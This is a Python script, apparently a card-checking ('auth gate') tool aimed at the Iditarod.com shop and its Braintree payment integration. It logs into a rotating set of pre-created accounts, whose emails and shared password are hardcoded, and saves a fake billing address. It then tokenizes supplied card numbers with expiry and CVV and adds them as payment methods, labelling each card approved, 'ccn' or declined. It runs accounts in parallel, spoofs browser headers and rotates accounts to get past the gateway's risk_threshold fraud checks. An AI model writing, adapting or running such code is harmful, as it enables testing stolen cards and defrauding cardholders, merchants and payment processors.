"""
Iditarod.com Braintree Auth Gate
Login -> payment-methods -> add-payment-method -> Braintree tokenize -> submit.
Rotates through pre-created accounts. Parses real success/decline/error responses.
"""

from __future__ import annotations

import base64
import json
import re
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Tuple, List

import requests
from bs4 import BeautifulSoup

BASE_URL = "https://iditarod.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
EDIT_BILLING_URL = f"{BASE_URL}/my-account/edit-address/billing/"
EDIT_ADDRESS_URL = f"{BASE_URL}/my-account/edit-address/"
PAYMENT_METHODS_URL = f"{BASE_URL}/my-account/payment-methods/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
ADMIN_AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"

IDITAROD_PASSWORD = "Mass007@in"
IDITAROD_ACCOUNTS = [
    "zc67o6vz7o@mrotzis.com",
    "sttw95b8qy@lnovic.com",
    "x3pyiucrod@xkxkud.com",
    "8e7cir36hq@illubd.com",
    "w1x3fop3vq@illubd.com",
    "4hdspn6bv8@mrotzis.com",
    "2u2q78yawq@xkxkud.com",
    "c8759pb0cm@mrotzis.com",
    "gy2zr77zxa@daouse.com",
    "9r0qd8ilrw@bwmyga.com",
]

_rotation_lock = threading.Lock()
_rotation_index = 0


def _next_account() -> Tuple[str, str]:
    global _rotation_index
    with _rotation_lock:
        idx = _rotation_index % len(IDITAROD_ACCOUNTS)
        _rotation_index += 1
    email = IDITAROD_ACCOUNTS[idx]
    return email, IDITAROD_PASSWORD


def _getstr(data: str, first: str, last: str) -> Optional[str]:
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end].strip()
    except ValueError:
        return None


def _normalize_proxy(proxy: Optional[str]) -> Optional[dict]:
    if not proxy or not str(proxy).strip():
        return None
    raw = str(proxy).strip()
    if "[" in raw or "]" in raw or raw.count(":") > 4:
        return None
    if not raw.startswith(("http://", "https://")):
        raw = f"http://{raw}"
    if "://" not in raw or len(raw) < 12:
        return None
    return {"http": raw, "https": raw}


def _card_brand(cc: str) -> str:
    """WooCommerce Braintree card-type: visa, master-card, amex, discover."""
    n = (cc or "").strip()
    if n.startswith("4"):
        return "visa"
    if n.startswith("5") or n.startswith("2"):
        return "master-card"
    if n.startswith("3"):
        return "amex"
    if n.startswith("6"):
        return "discover"
    return "visa"


def _default_headers(referer: str = "", origin: str = BASE_URL) -> dict:
    return {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none" if not referer else "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
        "referer": referer or BASE_URL + "/",
        "origin": origin,
    }


def _parse_login_nonce(html: str) -> Optional[str]:
    m = re.search(r'name=["\']woocommerce-login-nonce["\']\s+value=["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-login-nonce["\']', html, re.I)
    if m:
        return m.group(1)
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"name": "woocommerce-login-nonce"})
    return inp.get("value") if inp else None


def _parse_client_token_nonce(html: str) -> Optional[str]:
    m = re.search(r'["\']client_token_nonce["\']\s*:\s*["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'"client_token_nonce":"([^"]+)"', html)
    if m:
        return m.group(1)
    return _getstr(html, '"client_token_nonce":"', '"')


def _parse_add_payment_nonce(html: str) -> Optional[str]:
    m = re.search(
        r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    m = re.search(
        r'id=["\']woocommerce-add-payment-method-nonce["\'][^>]+value=["\']([^"\']+)["\']',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
    return inp.get("value") if inp else None


def _parse_edit_address_nonce(html: str) -> Optional[str]:
    m = re.search(
        r'name=["\']woocommerce-edit-address-nonce["\']\s+value=["\']([^"\']+)["\']',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    m = re.search(
        r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-edit-address-nonce["\']',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"name": "woocommerce-edit-address-nonce"})
    return inp.get("value") if inp else None


def _parse_woo_errors(html: str) -> list[str]:
    errs = []
    soup = BeautifulSoup(html, "html.parser")
    ul = soup.find("ul", class_=re.compile(r"woocommerce-error", re.I))
    if ul:
        for li in ul.find_all("li"):
            t = (li.get_text() or "").strip()
            if t:
                errs.append(t)
    if not errs:
        m = re.search(r'class=["\']woocommerce-error["\'][^>]*>[\s\S]*?<li[^>]*>([^<]+)', html, re.I)
        if m:
            errs.append(m.group(1).strip())
    return errs


def _is_risk_threshold(msg: str) -> bool:
    """True if response is risk_threshold / Gateway Rejected: risk_threshold (rotate account)."""
    if not msg or not isinstance(msg, str):
        return False
    u = msg.lower()
    return "risk_threshold" in u or "gateway rejected: risk_threshold" in u


def _is_valid_braintree_response(res: dict) -> bool:
    """
    True if result is a proper card response (approved, CCN, declined).
    False for HTTP/timeout/proxy/connection, risk_threshold, login/tokenize/add-payment errors.
    """
    status = (res or {}).get("status", "error")
    if status not in ("approved", "ccn", "declined"):
        return False
    resp = (res or {}).get("response") or ""
    u = resp.lower()
    invalid = (
        "risk_threshold" in u or "timeout" in u or "connection" in u or "proxy" in u
        or "login failed" in u or "tokenize" in u or "no token" in u or "add payment" in u
        or "request failed" in u or "login page" in u or "nonce" in u or "fingerprint" in u
    )
    return not invalid


def _parse_status_code_response(html: str) -> Optional[str]:
    """Extract 'Status code XXXX: ...' from woocommerce-error li (prefix Status code, suffix </li>)."""
    m = re.search(r'woocommerce-error[\s\S]*?<li[^>]*>\s*(Status code[^<]*?)\s*</li>', html, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'Status code\s+[^<]+', html, re.I)
    if m:
        return m.group(0).strip()
    soup = BeautifulSoup(html, "html.parser")
    ul = soup.find("ul", class_=re.compile(r"woocommerce-error", re.I))
    if ul:
        for li in ul.find_all("li"):
            t = (li.get_text() or "").strip()
            if "Status code" in t or "status code" in t.lower():
                return t
    errs = _parse_woo_errors(html)
    return errs[0] if errs else None


def _map_response_to_status(err_msg: str) -> Tuple[str, str]:
    u = err_msg.upper()
    if any(x in u for x in ("CVV", "CVC", "SECURITY CODE", "VERIFICATION")):
        return "ccn", err_msg[:80]
    if any(x in u for x in ("DECLINED", "DO NOT HONOR", "NOT AUTHORIZED", "INVALID", "EXPIRED", "LOST", "STOLEN", "PICKUP", "RESTRICTED", "FRAUD", "REVOKED", "CANNOT AUTHORIZE", "POLICY", "DO NOT TRY AGAIN")):
        return "declined", err_msg[:80]
    if any(x in u for x in ("INSUFFICIENT", "LIMIT")):
        return "declined", err_msg[:80]
    if any(x in u for x in ("STATUS CODE 2001", "2001")):
        return "declined", err_msg[:80]
    if any(x in u for x in ("STATUS CODE 2002", "2002")):
        return "declined", err_msg[:80]
    if any(x in u for x in ("STATUS CODE 2003", "2003")):
        return "declined", err_msg[:80]
    if any(x in u for x in ("STATUS CODE 2004", "2004")):
        return "ccn", err_msg[:80]
    if any(x in u for x in ("STATUS CODE 2005", "2005")):
        return "declined", err_msg[:80]
    if any(x in u for x in ("STATUS CODE 2006", "2006")):
        return "declined", err_msg[:80]
    if "STATUS CODE" in u or "2106" in u:
        return "declined", err_msg[:80]
    return "error", err_msg[:80]


def run_iditarod_check(
    card: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy: Optional[str] = None,
    fixed_account: Optional[Tuple[str, str]] = None,
) -> dict:
    """
    Full Iditarod Braintree flow: login -> add-payment-method -> tokenize -> submit.
    Returns {status, response} with status in approved|ccn|declined|error.
    If fixed_account is set, runs one attempt only; else rotates on login/risk_threshold.
    """
    if len(ano) == 4:
        ano = ano[2:]
    if len(mes) == 1:
        mes = f"0{mes}"
    yy = f"20{ano}"
    brand = _card_brand(card)
    proxies = _normalize_proxy(proxy)
    kw: dict = {"timeout": 45, "allow_redirects": True}
    if proxies:
        kw["proxies"] = proxies

    last_error: dict = {"status": "error", "response": "Request failed"}
    max_account_tries = 1 if fixed_account else len(IDITAROD_ACCOUNTS)
    use_fixed = fixed_account is not None

    for _ in range(max_account_tries):
        session = requests.Session()
        session.trust_env = False
        session.headers.update(_default_headers())
        try:
            email, password = fixed_account if use_fixed else _next_account()

            r = session.get(LOGIN_URL, **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Login page failed"}
                if use_fixed:
                    return last_error
                continue

            login_nonce = _parse_login_nonce(r.text)
            if not login_nonce:
                last_error = {"status": "error", "response": "Login nonce missing"}
                if use_fixed:
                    return last_error
                continue

            login_data = {
                "username": email,
                "password": password,
                "woocommerce-login-nonce": login_nonce,
                "_wp_http_referer": "/my-account/",
                "login": "Log in",
            }
            h = _default_headers(referer=LOGIN_URL, origin=BASE_URL)
            h["content-type"] = "application/x-www-form-urlencoded"
            h["cache-control"] = "max-age=0"
            r = session.post(LOGIN_URL, headers=h, data=login_data, **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Login request failed"}
                if use_fixed:
                    return last_error
                continue

            low = r.text.lower()
            if "logout" not in low and "log out" not in low and "dashboard" not in low:
                errs = _parse_woo_errors(r.text)
                if errs:
                    last_error = {"status": "error", "response": f"Login failed: {errs[0][:50]}"}
                else:
                    last_error = {"status": "error", "response": "Login failed (check account)"}
                if use_fixed:
                    return last_error
                continue

            r = session.get(EDIT_BILLING_URL, headers=_default_headers(referer=LOGIN_URL), **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Edit billing page failed"}
                if use_fixed:
                    return last_error
                continue
            edit_nonce = _parse_edit_address_nonce(r.text)
            if not edit_nonce:
                last_error = {"status": "error", "response": "Edit address nonce missing"}
                if use_fixed:
                    return last_error
                continue
            billing_data = {
                "billing_first_name": "Mass",
                "billing_last_name": "TH",
                "billing_country": "US",
                "billing_address_1": "7th street",
                "billing_address_2": "bridge road",
                "billing_city": "california",
                "billing_state": "CA",
                "billing_postcode": "90001",
                "billing_phone": "17472920712",
                "billing_email": email,
                "save_address": "Save address",
                "woocommerce-edit-address-nonce": edit_nonce,
                "_wp_http_referer": "/my-account/edit-address/billing/",
                "action": "edit_address",
            }
            h = _default_headers(referer=EDIT_BILLING_URL, origin=BASE_URL)
            h["content-type"] = "application/x-www-form-urlencoded"
            h["cache-control"] = "max-age=0"
            r = session.post(EDIT_BILLING_URL, headers=h, data=billing_data, **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Save billing failed"}
                if use_fixed:
                    return last_error
                continue

            session.get(EDIT_ADDRESS_URL, headers=_default_headers(referer=EDIT_BILLING_URL), **kw)
            session.get(PAYMENT_METHODS_URL, headers=_default_headers(referer=EDIT_ADDRESS_URL), **kw)

            r = session.get(ADD_PAYMENT_URL, headers=_default_headers(referer=PAYMENT_METHODS_URL), **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Add payment page failed"}

            client_token_nonce = _parse_client_token_nonce(r.text)
            add_payment_nonce = _parse_add_payment_nonce(r.text)
            if not client_token_nonce or not add_payment_nonce:
                return {"status": "error", "response": "Payment nonces missing"}

            ajax_headers = {
                **_default_headers(referer=ADD_PAYMENT_URL, origin=BASE_URL),
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
            }
            ajax_data = {
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce,
            }
            r = session.post(ADMIN_AJAX_URL, headers=ajax_headers, data=ajax_data, **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Client token request failed"}
            try:
                j = r.json()
                client = j.get("data") if isinstance(j, dict) else None
                if not client:
                    return {"status": "error", "response": "No client token"}
                decoded = base64.b64decode(client).decode("utf-8")
                bt = json.loads(decoded)
                auth_fp = bt.get("authorizationFingerprint")
                if not auth_fp:
                    return {"status": "error", "response": "No auth fingerprint"}
            except Exception as e:
                return {"status": "error", "response": f"Client token parse: {str(e)[:40]}"}

            graphql_headers = {
                "accept": "*/*",
                "authorization": f"Bearer {auth_fp}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            }
            graphql_payload = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables": {
                    "input": {
                        "creditCard": {"number": card, "expirationMonth": mes, "expirationYear": yy, "cvv": cvv},
                        "options": {"validate": False},
                    }
                },
                "operationName": "TokenizeCreditCard",
            }
            r = session.post(BRAINTREE_GRAPHQL, headers=graphql_headers, json=graphql_payload, **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Braintree tokenize request failed"}
            try:
                j = r.json()
            except Exception as e:
                return {"status": "error", "response": f"Tokenize JSON parse: {str(e)[:40]}"}

            errs = j.get("errors")
            if errs and isinstance(errs, list):
                err = errs[0] if errs else {}
                msg = (err.get("message", "Unknown") if isinstance(err, dict) else str(err)) or "Unknown"
                if _is_risk_threshold(msg):
                    last_error = {"status": "error", "response": msg}
                    if use_fixed:
                        return last_error
                    continue
                st, resp = _map_response_to_status(msg)
                return {"status": st, "response": resp}

            data = j.get("data") or {}
            tt = (data.get("tokenizeCreditCard") or {}).get("token")
            if not tt:
                return {"status": "error", "response": "No token from Braintree"}

            form_headers = {
                **_default_headers(referer=ADD_PAYMENT_URL, origin=BASE_URL),
                "content-type": "application/x-www-form-urlencoded",
                "cache-control": "max-age=0",
            }
            form_data = [
                ("payment_method", "braintree_credit_card"),
                ("wc-braintree-credit-card-card-type", brand),
                ("wc-braintree-credit-card-3d-secure-enabled", ""),
                ("wc-braintree-credit-card-3d-secure-verified", ""),
                ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
                ("wc_braintree_credit_card_payment_nonce", tt),
                ("wc_braintree_device_data", ""),
                ("wc-braintree-credit-card-tokenize-payment-method", "true"),
                ("woocommerce-add-payment-method-nonce", add_payment_nonce),
                ("_wp_http_referer", "/my-account/add-payment-method/"),
                ("woocommerce_add_payment_method", "1"),
            ]
            r = session.post(ADD_PAYMENT_URL, headers=form_headers, data=form_data, **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Add payment submit failed"}

            txt = r.text
            success_phrases = [
                "payment method added",
                "payment method successfully added",
                "new payment method added",
                "nice! new payment method",
            ]
            if any(p in txt.lower() for p in success_phrases):
                cc_info = (data.get("tokenizeCreditCard") or {}).get("creditCard") or {}
                bd = cc_info.get("binData") or {}
                bank = (bd.get("issuingBank") or "N/A")[:25]
                br = cc_info.get("brandCode") or "N/A"
                return {"status": "approved", "response": f"CVV VALID ✓ | {br} | Bank: {bank}"}

            status_code_msg = _parse_status_code_response(txt)
            if status_code_msg:
                if _is_risk_threshold(status_code_msg):
                    last_error = {"status": "error", "response": status_code_msg}
                    if use_fixed:
                        return last_error
                    continue
                st, _ = _map_response_to_status(status_code_msg)
                return {"status": st, "response": status_code_msg}
            errs = _parse_woo_errors(txt)
            if errs:
                raw = " ".join(errs)
                if _is_risk_threshold(raw):
                    last_error = {"status": "error", "response": raw}
                    if use_fixed:
                        return last_error
                    continue
                st, _ = _map_response_to_status(raw)
                return {"status": st, "response": raw}

            if "woocommerce-error" in txt.lower():
                return {"status": "error", "response": "Card declined (no message)"}

            return {"status": "declined", "response": "Declined (no success message)"}

        except requests.exceptions.Timeout:
            last_error = {"status": "error", "response": "Request Timeout"}
        except requests.exceptions.ConnectionError:
            last_error = {"status": "error", "response": "Connection Error"}
        except requests.exceptions.ProxyError:
            last_error = {"status": "error", "response": "Proxy Error"}
        except Exception as e:
            last_error = {"status": "error", "response": f"Error: {str(e)[:50]}"}
        finally:
            try:
                session.close()
            except Exception:
                pass

    return last_error


_BT_PARALLEL_EXECUTOR: Optional[ThreadPoolExecutor] = None


def _get_bt_executor() -> ThreadPoolExecutor:
    global _BT_PARALLEL_EXECUTOR
    if _BT_PARALLEL_EXECUTOR is None:
        _BT_PARALLEL_EXECUTOR = ThreadPoolExecutor(max_workers=len(IDITAROD_ACCOUNTS))
    return _BT_PARALLEL_EXECUTOR


def run_iditarod_check_parallel(
    card: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy: Optional[str] = None,
) -> dict:
    """
    Run Iditarod Braintree check across all accounts in parallel (multi-thread).
    Returns first non-risk_threshold result; if all risk_threshold, returns last.
    """
    accounts: List[Tuple[str, str]] = [(e, IDITAROD_PASSWORD) for e in IDITAROD_ACCOUNTS]
    executor = _get_bt_executor()
    future_list = [
        executor.submit(
            run_iditarod_check,
            card,
            mes,
            ano,
            cvv,
            proxy,
            fixed_account=(email, password),
        )
        for email, password in accounts
    ]
    last_result: dict = {"status": "error", "response": "Request failed"}
    for fut in as_completed(future_list):
        try:
            res = fut.result()
        except Exception as e:
            res = {"status": "error", "response": str(e)[:50]}
        last_result = res
        if _is_valid_braintree_response(res):
            for o in future_list:
                if o is not fut and not o.done():
                    o.cancel()
            return res
    return last_result
